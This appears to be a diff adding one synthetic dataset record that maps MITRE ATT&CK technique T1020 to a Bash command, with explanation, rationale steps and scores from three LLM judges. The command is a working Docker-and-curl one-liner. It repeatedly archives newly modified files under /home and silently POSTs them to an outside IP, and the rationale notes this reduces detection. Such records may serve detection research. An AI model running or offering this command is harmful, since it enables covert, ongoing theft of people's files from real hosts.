@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_delta --network host -e HN=$(hostname) -v /home:/data:ro curlimages/curl:8.8.0 sh -c 'STAMP=/tmp/.stamp; touch -d \"1970-01-01\" \"$STAMP\"; while true; do TMP=/tmp/delta_$(date +%s).tgz; find /data -type f -newer \"$STAMP\" -print0 | tar --null -T - -czf \"$TMP\" 2>/dev/null || true; if [ -s \"$TMP\" ]; then curl -s -X POST -H \"Content-Type: application/octet-stream\" --data-binary @\"$TMP\" \"http://203.0.113.15:8080/delta?host=$HN\"; fi; touch \"$STAMP\"; rm -f \"$TMP\"; sleep 600; done'",
+  "explanation": "Automates differential exfiltration by sending only files modified since the last run using silent HTTP POSTs.",
+  "rationale_steps": [
+    "Tracks last exfil time via a stamp file to avoid resending unchanged data",
+    "Finds new/modified files, tars them into a small archive",
+    "Uploads with curl in silent mode to reduce detection opportunities",
+    "Repeats at fixed intervals to maintain automated exfil"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-16c9e604",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command and embedded shell script are properly quoted with valid flags and separators, making it well-formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates periodic differential packaging and HTTP POST transfer from a mounted host directory, aligning with T1020, though practicality depends on the container image including find/tar and touch -d support and the specified IP being reachable.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T04:07:26.745891Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid Docker flags, and correct shell syntax throughout the complex script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by creating a containerized process that continuously monitors for new/modified files, packages them with tar, and exfiltrates them via HTTP POST to a remote server on a regular schedule with proper tracking of already-sent files.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:56:59.853654Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, proper separators, and no discernible syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated, differential exfiltration via HTTP POST, using appropriate tools and techniques like containerization, timestamping, compression, and scheduled execution.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T05:57:16.676863Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
